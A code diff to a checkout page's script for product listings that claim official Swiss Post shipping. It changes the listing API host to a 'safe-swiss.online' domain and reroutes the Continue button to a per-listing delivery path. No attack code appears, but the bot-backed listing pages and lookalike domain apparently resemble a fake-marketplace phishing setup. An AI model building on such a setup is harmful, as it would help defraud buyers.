@@ -2542,7 +2542,7 @@ Official Swiss Post priority shipping (A-Post Priority). Next business day deliv
       /* ==========================================================================
          CONFIG LOADER & THEME APPLIER
          ========================================================================== */
-      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://catalog-bot-rx1t.onrender.com').replace(/\/$/, '');
+      const LISTING_API_BASE_URL = (window.LISTING_API_BASE_URL || 'https://api.safe-swiss.online').replace(/\/$/, '');
 
       function getListingSlug() {
         const pathMatch = window.location.pathname.match(/\/p\/([A-Za-z0-9]{8})(?:\/)?$/);
@@ -3159,7 +3159,7 @@ Official Swiss Post priority shipping (A-Post Priority). Next business day deliv
           mobileSelect.addEventListener('change', (e) => setLanguage(e.target.value));
         }
 
-        // Continue Button -> Dispatches checkout_started and navigates to step-2.html
+            // Continue Button -> Dispatches checkout_started and navigates to the delivery route
         const continueBtn = document.getElementById('btn-continue');
         if (continueBtn) {
           continueBtn.addEventListener('click', function (e) {
@@ -3184,7 +3184,8 @@ Official Swiss Post priority shipping (A-Post Priority). Next business day deliv
             const nextParams = new URLSearchParams(window.location.search);
             if (slug) nextParams.set('slug', slug);
             const search = nextParams.toString() ? `?${nextParams.toString()}` : '';
-            window.location.assign('/step-2.html' + search);
+            const deliveryPath = slug ? `/p/${encodeURIComponent(slug)}/delivery` : `/step-2.html${search}`;
+            window.location.assign(deliveryPath);
           });
         }
 
